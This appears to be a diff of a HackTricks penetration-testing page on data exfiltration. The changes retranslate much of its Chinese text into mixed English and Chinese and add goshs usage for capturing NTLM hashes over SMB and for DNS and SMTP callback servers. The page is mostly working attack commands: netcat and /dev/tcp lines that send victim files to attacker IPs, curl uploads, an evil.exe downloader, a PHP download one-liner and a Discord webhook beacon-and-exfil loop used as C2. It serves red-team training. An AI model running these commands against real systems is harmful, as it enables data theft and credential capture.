@@ -1,19 +1,19 @@
-# 数据外传
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> 有关在 `C:\Users\Public` 暂存 loot 并使用 Rclone exfiltrating 来模拟合法备份的端到端示例，请查看下面的工作流程。
+> 如需一个端到端示例：在 `C:\Users\Public` 中 staging loot，并使用 Rclone 将其 exfiltrate 以模拟合法 backups，请查看下面的流程。
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## 常见被列入白名单用于 exfiltrate 信息的域名
+## 常用于 white-listed 用于 exfiltrate information 的 domains
 
-查看 [https://lots-project.com/](https://lots-project.com/) 以查找可被滥用的常见白名单域名
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
-## 复制\&粘贴 Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -53,7 +53,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS 服务器**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,14 +107,45 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) 是 `python3 -m http.server` 的单文件替代品，具备上传、下载、WebDAV、SFTP、SMB、TLS、身份验证、共享链接以及 OOB 协作功能（DNS、SMTP、NTLM hash capture）。
+```bash
+# Serve current directory on port 8000
+goshs
+
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks 是只写的 HTTPS 端点，接受 JSON 和可选的文件部分。它们通常被允许访问受信任的 SaaS 域名，且不需要 OAuth/API keys，使其适用于低摩擦的 beaconing 和 exfiltration。
+Webhooks 是只写的 HTTPS 端点，接受 JSON 和可选的文件部分。它们通常被允许用于受信任的 SaaS 域名，并且不需要 OAuth/API keys，因此很适合低摩擦的 beaconing 和 exfiltration。
 
 Key ideas:
-- 端点：Discord uses https://discord.com/api/webhooks/<id>/<token>
-- 使用 POST multipart/form-data，包含名为 payload_json 的一部分，内容为 {"content":"..."}，以及可选的名为 file 的文件部分。
-- 操作员循环模式：periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK 确认送达。
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -184,9 +215,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-注意：
-- 类似的模式适用于其他协作平台 (Slack/Teams) 使用它们的 incoming webhooks；请相应调整 URL 和 JSON schema。
-- 有关 Discord Desktop 缓存工件的 DFIR 以及 webhook/API 恢复，请参见：
+Notes:
+- 类似的模式也适用于其他 collaboration platforms（Slack/Teams），使用它们的 incoming webhooks；相应调整 URL 和 JSON schema。
+- 关于 Discord Desktop cache artifacts 和 webhook/API recovery 的 DFIR，请参见：
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -194,7 +225,7 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### FTP 服务器 (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -235,14 +266,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali 作为服务器
+Kali 作为 server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-或者创建一个 smb 共享 **使用 samba**:
+或使用 samba 创建一个 smb share：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +296,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) 是一个单二进制替代方案，
+它通过 SMB 提供文件服务，并从连接的客户端捕获 NetNTLMv2 hashes：
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-攻击者必须让 SSHd 处于运行状态。
+攻击者必须运行 SSHd。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-如果 victim 有 SSH，attacker 可以将 victim 的目录挂载到 attacker 主机上。
+如果受害者有 SSH，攻击者可以将受害者上的目录挂载到攻击者本地。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -291,7 +332,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 向受害者上传文件
+### 上传文件到 victim
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -320,22 +361,36 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果你能向 SMTP 服务器发送数据，你可以用 python 创建一个 SMTP 来接收这些数据：
+如果你可以向一个 SMTP server 发送数据，你就可以用 python 创建一个 SMTP 来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) 可以快速启动一个 SMTP server，
+用于在 OOB exfiltration 场景中捕获 email callbacks：
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+收到的 emails 和 callbacks 会直接显示在终端输出中。  
+可以与 DNS callback server 结合使用，以实现完整的 OOB 覆盖：
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-在 XP 和 2003 中默认启用（在其他系统中需要在安装时显式添加）
+默认情况下，在 XP 和 2003 中（在其他系统中，需要在安装期间显式添加）
 
-在 Kali，**start TFTP server**:
+在 Kali 中，**启动 TFTP server**：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP 服务器（使用 python）：**
+**Python 中的 TFTP server:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -346,7 +401,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-使用 PHP 单行命令下载文件:
+使用 PHP oneliner 下载文件：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -388,7 +443,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 程序不仅允许检查二进制文件，还具有 **从 hex 重建它们的能力**。这意味着通过提供某个二进制的 hex，`debug.exe` 可以生成该二进制文件。然而，重要的是要注意 debug.exe 有一个 **只能组装不超过 64 kb 的文件的限制**。
+`debug.exe` 程序不仅允许检查二进制文件，还具有**从 hex 重新构建它们**的能力。这意味着，通过提供某个二进制文件的 hex，`debug.exe` 可以生成该二进制文件。不过，需要注意的是，debug.exe **有一个限制：只能组装大小最多 64 kb 的文件**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -401,8 +456,9 @@ wine exe2bat.exe nc.exe nc.txt
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## 参考
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
